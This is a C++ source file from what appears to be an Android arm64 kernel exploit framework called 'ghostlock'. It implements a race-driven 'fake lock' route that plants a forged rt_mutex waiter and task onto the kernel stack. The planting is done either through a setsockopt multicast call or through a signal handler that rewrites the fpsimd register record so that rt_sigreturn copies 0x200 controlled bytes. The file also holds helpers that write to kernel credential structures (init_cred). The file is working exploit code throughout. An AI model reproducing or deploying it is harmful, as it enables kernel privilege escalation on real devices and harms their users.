#include <netinet/in.h>
#include <ctime>
#include <unistd.h>

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "memory/payload_builder.h"
#include "route/route_status.h"
#include "session/exploit_session.hpp"
#include "kernel/target.h"

using namespace ghostlock;

/*
 * Native 64-bit punch: rt_sigreturn's fpsimd bulk copy (HANDOFF 21).
 *
 *   __arm64_sys_rt_sigreturn (frame 0x2b0)
 *     0x68e804  add x0, sp, #0x30          <- destination
 *     0x68e808  mov w2, #0x200             <- 0x200 bytes
 *     0x68e80c  bl  __arch_copy_from_user
 *   => writes the payload onto the *current* thread's kernel stack at depth
 *      [0x80, 0x280], which covers the futex rt_mutex_waiter at depth 0x198.
 *
 * The source is the sigframe's fpsimd_context.vregs, i.e. everything inside
 * uc->uc_mcontext.__reserved, so a SA_SIGINFO handler patching that record and
 * then returning hands the kernel 0x200 fully-controlled bytes.
 *
 * Selected at runtime with GL_PUNCH=sigret so the existing payload/geometry
 * plumbing (multicast_waiter profile section) is reused unchanged.
 */
#if defined(__ANDROID__) && defined(__aarch64__)
#include <pthread.h>
#include <signal.h>

namespace {
    constexpr std::uint32_t kFpsimdMagic = 0x46508001u;
    const unsigned char *g_punch_src = nullptr;
    std::size_t g_punch_len = 0;
    volatile int g_punch_patched = 0;

    void gl_sigret_handler(int, siginfo_t *, void *uctx) {
        auto *uc = static_cast<ucontext_t *>(uctx);
        auto *res = reinterpret_cast<unsigned char *>(uc->uc_mcontext.__reserved);
        const std::uint32_t zero = 0;
        for (int off = 0; off + 16 <= 4096;) {
            std::uint32_t magic = 0, size = 0;
            memcpy(&magic, res + off, 4);
            memcpy(&size, res + off + 4, 4);
            if (magic == 0 || size < 16 || size > 4096) break;
            if (magic == kFpsimdMagic) {
                /* struct fpsimd_context { head{magic,size}; u32 fpsr; u32 fpcr;
                 *                         __uint128_t vregs[32]; } */
                memcpy(res + off + 8, &zero, 4);   /* fpsr */
                memcpy(res + off + 12, &zero, 4);  /* fpcr: no FP exceptions */
                const std::size_t n = g_punch_len < 0x200 ? g_punch_len : 0x200;
                memset(res + off + 16, 0, 0x200);
                memcpy(res + off + 16, g_punch_src, n);
                g_punch_patched = 1;
                return;
            }
            off += static_cast<int>(size);
        }
    }

    /* Must be called on the waiter thread that owns the re-armed stack. */
    bool gl_sigret_punch(const unsigned char *buf, std::size_t len) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_sigaction = gl_sigret_handler;
        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        if (sigaction(SIGUSR1, &sa, nullptr) != 0) return false;
        sigset_t ss;
        sigemptyset(&ss);
        sigaddset(&ss, SIGUSR1);
        pthread_sigmask(SIG_UNBLOCK, &ss, nullptr);
        g_punch_src = buf;
        g_punch_len = len;
        g_punch_patched = 0;
        pr_info("sigret punch: raise(SIGUSR1) payload=%zu waiter_off=0x%zx\n", len,
                (std::size_t) 0xe8);
        raise(SIGUSR1);
        return g_punch_patched == 1;
    }
} // namespace
#else
    bool gl_sigret_punch(const unsigned char *, std::size_t) { return false; }
#endif

namespace ghostlock::route {
    route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
        (void) request;
        route::RouteStatus status = {.code = ROUTE_RETRYABLE};
        profile::MulticastWaiterLayout layout =
                session::g_exploit_session.profile.multicast_layout();
        /* Absent geometry (e.g. an underivable waiter_off) is a hard refusal:
         * one-shot multicast must never guess a landing. */
        if (!layout.buffer_size || !layout.waiter_offset || !layout.task_offset ||
            !layout.lock_offset) {
            status.step = 58;
            status.error_number = EINVAL;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
            return status;
        }
        const size_t stamp_size = *layout.buffer_size;
        /* VLA size comes from the validated profile geometry; the encode step
     * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
        memset(stamp, 0, sizeof(stamp));
        if (!memory::encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(stamp), stamp_size},
            static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
            *layout.lock_offset,
            (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
            status.step = 59;
            status.error_number = EOVERFLOW;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
                       "lock=%zu buffer=%zu\n", static_cast<size_t>(*layout.waiter_offset),
                       static_cast<size_t>(*layout.task_offset),
                       static_cast<size_t>(*layout.lock_offset), stamp_size);
            return status;
        }
        uint16_t family = AF_UNSPEC;
        memcpy(stamp + 8, &family, sizeof(family));

        /* One punch is one lottery ticket: the guest copy races skb page
         * recycling, so a single draw misses often. Profiles that do not set
         * these knobs keep the historical one-shot behaviour (attempts=1). */
        const uint32_t attempts = session::g_exploit_session.profile.mcast_attempts();
        const uint32_t arm_sequence = session::g_exploit_session.profile.mcast_arm_sequence();
        const uint32_t arm_hold = session::g_exploit_session.profile.mcast_arm_hold();
        const char *punch_env = getenv("GL_PUNCH");
        const bool use_sigret = punch_env && strcmp(punch_env, "sigret") == 0;
        pr_info("multicast route enter waiter_off=0x%zx buffer=0x%zx attempts=%u "
                "arm_seq=%u arm_hold=%u punch=%s\n",
                static_cast<size_t>(*layout.waiter_offset), stamp_size, attempts,
                arm_sequence, arm_hold, use_sigret ? "sigret" : "setsockopt");

        int32_t stamp_result = -1;
        int32_t won_seq = 0;
        for (uint32_t attempt = 1; attempt <= attempts; attempt++) {
            /* Re-encode every round: the buffer is the source userspace hands
             * to the kernel, but a partially consumed copy must never leak
             * into the next draw. */
            memset(stamp, 0, sizeof(stamp));
            if (!memory::encode_multicast_waiter(
                {reinterpret_cast<std::byte *>(stamp), stamp_size},
                static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
                *layout.lock_offset,
                (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
                break;
            }
            memcpy(stamp + 8, &family, sizeof(family));

            session::g_exploit_session.race.consumer_calls.store(0);
            session::g_exploit_session.race.consumer_success.store(0);
            session::g_exploit_session.race.consumer_stop.store(0);
            session::g_exploit_session.race.route_delay_usec.store(0);

            if (use_sigret) {
                errno = 0;
                stamp_result = gl_sigret_punch(stamp, stamp_size) ? 0 : -1;
                status.step = 61;
                status.error_number = stamp_result == 0 ? 0 : EIO;
            } else {
                int32_t fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
                if (fd < 0) {
                    status.step = 60;
                    status.error_number = errno;
                    status.userspace_clean = 1;
                    status.kernel_disarmed = 1;
                    status.code = ROUTE_FALLBACK_SAFE;
                    return status;
                }
                errno = 0;
                stamp_result = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp,
                                          (socklen_t) sizeof(stamp));
                status.step = 61;
                status.error_number = errno;
                close(fd);
            }
            session::g_exploit_session.race.consumer_go.store(1);
            for (int32_t spin = 0; spin < 100000000 &&
                               session::g_exploit_session.race.consumer_calls.load() == 0; spin++)
                __asm__ volatile (


            "yield"
            ::: "memory");
            session::g_exploit_session.race.consumer_go.store(0);
            while (session::g_exploit_session.race.consumer_inflight.load())
                __asm__ volatile (


            "yield"
            ::: "memory");

            if (stamp_result == 0 ||
                session::g_exploit_session.race.consumer_success.load() > 0) {
                won_seq = static_cast<int32_t>(attempt);
                break;
            }
            if (attempt <= 60)
                pr_info("[dbg] multicast seq=%u punch=%d calls=%d success=%d errno=%d\n",
                        attempt, stamp_result,
                        session::g_exploit_session.race.consumer_calls.load(),
                        session::g_exploit_session.race.consumer_success.load(),
                        status.error_number);
            /* Between arming rounds, hand the scheduler a window so the
             * consumer thread cannot stay parked on the previous draw. */
            if (arm_sequence && arm_hold && attempt % arm_sequence == 0) {
                for (uint32_t hold = 0; hold < arm_hold; hold++)
                    __asm__ volatile ("yield" ::: "memory");
            }
        }
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        if (won_seq > 0) {
            status.step = 0;
            status.error_number = 0;
            status.code = ROUTE_OK;
        } else {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d won=%d/%u\n",
                status.code, status.userspace_clean, status.kernel_disarmed,
                status.step, status.error_number, won_seq, attempts);
        return status;
    }

    /* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
} // namespace ghostlock::route

#if defined(__ANDROID__)
#include "race/threads.hpp"
#include "route/route_policy.hpp"

namespace ghostlock::route {
    /* MulticastPolicy route hooks (Batch 4). Declared in route_policy.hpp,
     * defined here because the implementations are Android-only. The one-shot
     * route keeps its own small stack frame in
     * do_kernel5_fake_lock_route() and shares only the pure payload encoding. */
    bool MulticastPolicy::w2_fast_repair_prebuild(
        session::ExploitSession &exploit_session) noexcept {
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        (exploit_session.heap.current.base) =
                support::prepare_good_kernel_page(repair_request);
        if (!(exploit_session.heap.current.base) || !support::stash_prebuilt_page()) {
            pr_warning("W2 fast repair prebuild failed\n");
            support::discard_prebuilt_page();
            return false;
        }
        pr_info("W2 fast repair payload prebuilt\n");
        return true;
    }

    bool MulticastPolicy::w2_fast_repair_activate(
        session::ExploitSession &exploit_session) noexcept {
        if (!support::activate_prebuilt_page()) {
            pr_warning("W2 fast repair activation failed\n");
            return false;
        }
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        pr_info("W2b: firing prebuilt init_cred+8 repair\n");
        exploit_session.race.fast_repair.store(1);
        const Status repaired = race::run_main_route_threads(repair_request);
        exploit_session.race.fast_repair.store(0);
        if (!repaired) {
            pr_warning("W2 fast repair route failed\n");
            return false;
        }
        return true;
    }
} // namespace ghostlock::route
#endif
